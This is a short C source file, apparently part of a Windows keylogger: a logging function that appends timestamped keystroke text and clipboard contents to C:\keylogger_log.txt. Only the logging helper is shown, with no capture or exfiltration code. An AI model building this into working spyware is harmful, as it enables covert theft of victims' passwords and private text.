#include "winkey.h"

VOID log(void *toLog, int MODE, BOOL putDate)
{
    FILE *f = fopen("C:\\keylogger_log.txt", "a+");
    if (putDate)
    {
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        fprintf(f, "\n[%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
    }
    if (MODE == CHAR_MODE)
        fprintf(f, "%s", (LPSTR)toLog);
    else if (MODE == WCHAR_MODE)
        fprintf(f, "%ws", (WCHAR *)toLog);
    else if (MODE == CLPB_MODE)
        fprintf(f, "[Clipboard] %s\n", (LPSTR)toLog);
    fclose(f);
}